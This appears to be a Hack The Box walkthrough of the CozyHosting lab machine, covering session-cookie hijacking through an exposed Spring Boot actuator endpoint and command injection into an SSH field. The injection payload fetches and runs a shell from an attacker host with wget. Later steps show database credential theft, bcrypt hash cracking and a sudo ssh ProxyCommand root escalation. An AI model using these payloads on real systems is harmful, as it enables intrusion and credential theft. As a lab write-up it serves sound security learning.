# HTB: CozyHosting walkthrough

![cozyhosting machine pwned](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/boxpwned.png "cozyhosting machine pwned")

## Introduction

The initial scan using Nmap reveals open ports, including SSH and an nginx server hosting a web app built with the SpringBoot framework. The walkthrough focuses on exploring this web application, using tools like Ffuf to discover valuable endpoints such as "/actuator/sessions." This reveals an exploitable session ID vulnerability, allowing the attacker to manipulate cookies creatively and gain access to an admin page, establishing a foothold. The write-up covers two lateral movement methods, specifically the extraction of a jar file. Within these files discovers the username and password for a Postgres database, providing further access. Following the escalation path, the guide demonstrates the cracking of the admin user's password hash, granting access to the josh user. Privilege escalation then reveals superuser permissions for the SSH command, ultimately achieving a root shell using a clever technique documented in GTFOBins.

## Machine Enumeration

Run the Nmap scan and discover the open ports.

```
# Nmap 7.94SVN scan initiated Wed Feb 28 09:24:04 2024 as: nmap -sCV -o nmap/nmap.init 10.10.11.230
Nmap scan report for 10.10.11.230
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 28 09:24:35 2024 -- 1 IP address (1 host up) scanned in 31.20 seconds
```

The Namp scan shows that default ssh port 22 is open and nginx server is running on Port 80. The Nmap also show the cozyhosting.htb domain which is stored in `/etc/hosts` file.

![Home page](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/homepage.png "Home page")

The above screenshot shows the home screen of the web application. Using the Ffuf tool to search other paths and files on a targeted website.

```
ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 72ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 299ms]
index                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 40ms]
login                   [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 40ms]
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
:: Progress: [4614/4614] :: Job [1/1] :: 376 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

I found several pages, but the admin and error pages look important.

![Error page](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/errorpage.png "Error page")

The above screenshot error message title is "Whitelabel Error Page".

![Error message enumeration](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/errorpageenum.png "Error message enumeration")

Using this term, I searched on the internet and found that the targeted machine is running a web application that is based on the SpringBoot framework. I did the Spring Boot framework directory and file fuzzing using the below wordlist.

```
ffuf -u http://cozyhosting.htb/FUZZ -w ~/Tools/SecLists/Discovery/Web-Content/spring-boot.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /root/Tools/SecLists/Discovery/Web-Content/spring-boot.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 171ms]
actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 185ms]
actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 233ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 63ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 61ms]
actuator/sessions       [Status: 200, Size: 98, Words: 1, Lines: 1, Duration: 2437ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 2471ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 2505ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 187ms]
:: Progress: [112/112] :: Job [1/1] :: 42 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

## Foothold

I found the actuator/sessions page using the Ffuf tool.

![Sessions page](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/sessionspage.png "Sessions page")

This page looks like the username "Kanderson" and random text were found. It looks like a session ID. I visited the login page and changed the session cookie value, which is found on Sessions's page. This value led me to the admin page.

![login page cookie change](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/loginpagecookiechange.png "login page cookie change")

![Admin page](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/adminpage.png "Admin page")

The admin page has host and username check functionality.

![Host functionality](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/hostfuncheck.png "Host functionality")

I tried the username and hostname combination as mentioned below, but could not find anything and got the same error message every time.

|Hostname|Username|Error message|
|-|-|-|
|cozyhosting|kanderson|Host key verification failed.|
|cozyhosting|anderson|Host key verification failed.|
|cozyhosting|admin|Host key verification failed.|
|cozyhosting|www|Host key verification failed.|

Then I keep the username empty and the error message changed, which looks like below.

![Username empty error](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/usernameemptyerror.png "Username empty error")

![White space error](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/whitespaceerror.png "White space error")

This error message looks like a help message from the ssh command. So, I thought that I could inject the command into the username field. I tried to test the command, but it gave me a whitespace error. This [IFS article](https://www.tutorialspoint.com/the-meaning-of-ifs-in-bash-scripting-on-linux) helped to resolve this issue.

![Space issue resolve](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/spaceissueresolve.png "Space issue resolve")

I intercepted the above request using the Burp Suite tool. I created a "shell" file. Then I uploaded a shell file on the targeted machine, changed the permissions of the uploaded file, and ran the shell file using the Burp Suite tool's Repeter functionality. Below, I have mentioned commands and screenshots of these steps.

Commands on the web application:

```bash
;wget${IFS}http://10.10.16.23:50505/shell${IFS}-P${IFS}/tmp/shell;

;chmod${IFS}777${IFS}/tmp/shell/shell;

;/tmp/shell/shell;
```

Attacker's machine command:

`python3 -m http.server 50505`

![Shell upload](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/shellupload.png "Shell upload")

![Change permission](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/changepermission.png "Change permission")

![Web shell](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/webshell.png "Web shell")

## Lateral Movement

### Method 1: Extract the Jar file

Once I got the shell on the targeted machine, I checked, but I still didn't have user-level access. So, I downloaded the cloudhosting-0.0.1.jar file into my system by starting the Python server on the targeted machine, and using the wget tool, I downloaded that file into my system. I started a Python server on the targeted system in the `/app` directory.

The targeted machine's terminal command:

```bash
python3 -m http.server 50505
```

Attacker machine's (My machine) command:

```bash
wget http://cozyhosting.htb:50505/cloudhosting-0.0.1.jar
```

![jar file transfer](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/jarfiletransfer.png "jar file transfer")

Once it downloaded the cloudhosting-0.0.1.jar file into my system, I extracted the files by following the below command.

`jar xf cloudhosting-0.0.1.jar`

### Method 2: Extract the Jar file

Once you get the shell, just extract the file using the unzip command on the targeted machine.

`unzip -d /tmp/app cloudhosting-0.0.1.jar`

The above command extracts the jar compressed file into the `/tmp/app` directory.

---

I demonstrated two methods of extracting the jar file here. Because the method I used is method 1, and that is a bit long and complicated. But after I saw the official HTB write-up (Author: Commandercool) for this challenge, I got the idea that method 2 could be very easy to extract the jar file from within the victim machine.

```
cat BOOT-INF/classes/application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Once it was extracted, I found a file that contained the Postgres database's username and password. The username is `postgres` and the password is `Vg&nvzAQ7XxR`.

After getting the username and password, I searched on the internet for how to connect with the Progress database and found a [Postgres cheatsheet](https://www.timescale.com/learn/postgres-cheat-sheet/databases) and [HackTrick's postgres enumeration methods](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql).

I used the above resources to get database access and found the admin user's password hash.

```
psql -h 127.0.0.1 -U postgres

/l

 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres

/d

public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres

SELECT * FROM users;

 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

I stored the password hash into the adminHash file and sprayed the rockyou wordlist using the JohnTheRipper tool.

```
john --wordlist=/root/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt adminHash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:01:10 DONE (2024-03-02 14:10) 0.01421g/s 39.90p/s 39.90c/s 39.90C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The JohnTheRipper tool cracked the password for the admin user, which is 'manchesterunited', and I tried to login using that password for the user. The user was `josh`. I successfully logged in as a josh using the SSH protocol.

`ssh josh@cozyhosting.htb`

![josh user access](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/joshaccess.png "josh user access")

I got the Josh user access and user flag.

## Privilege Escalation

I checked the `sudo -l` commond to check which super user permission has the Josh user.

![sudo ssh access](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/sudosshaccess.png "sudo ssh access")

The above screenshot shows that I can access the ssh command as a super user.

I checked the [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo) website and found that I could access the root shell by following the command.

`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

![root access](https://github.com/het-desai/hackthebox/blob/main/cozyhosting/screenshots/rootaccess.png "root access")

Explanation: The above command runs as a super user (root), and before the ssh opens a session, the `-o` flag's value `ProxyCommand` starts the root shell in the current terminal.